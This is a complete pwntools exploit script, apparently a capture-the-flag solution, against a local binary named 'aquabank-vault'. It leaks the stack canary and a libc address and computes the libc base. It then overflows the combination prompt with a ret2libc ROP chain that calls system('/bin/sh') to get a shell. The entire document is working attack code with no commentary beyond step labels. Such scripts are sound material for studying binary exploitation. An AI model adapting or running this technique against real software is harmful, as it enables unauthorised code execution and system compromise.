#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./aquabank-vault", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = process(elf.path)

LIBC_LEAK_OFFSET = 0x2A1CA

# Step 1: Leak the stack canary and a libc address
p.sendlineafter(b"> ", b"1")
p.sendafter(b"Type the receipt header (up to 64 chars):", b"A" * 64)

p.recvuntil(b"--- RECEIPT ---\n")
leak = p.recv(256)

canary = u64(leak[72:80])
libc_leak = u64(leak[152:160])

log.success(f"Canary: {canary:#x}")
log.success(f"Libc leak: {libc_leak:#x}")

# Step 2: Calculate the libc base
libc.address = libc_leak - LIBC_LEAK_OFFSET
log.success(f"Libc base: {libc.address:#x}")

# Step 3: Resolve addresses for the ret2libc chain
rop = ROP(libc)

ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
binsh = next(libc.search(b"/bin/sh\x00"))
system_addr = libc.symbols["system"]

log.info(f"ret: {ret:#x}")
log.info(f"pop rdi; ret: {pop_rdi:#x}")
log.info(f"/bin/sh: {binsh:#x}")
log.info(f"system: {system_addr:#x}")

# Step 4: Build the overflow payload
payload = b"A" * 136
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_addr)

# Step 5: Trigger the overflow
p.sendlineafter(b"> ", b"2")
p.sendafter(b"Enter your combination:", payload)

p.interactive()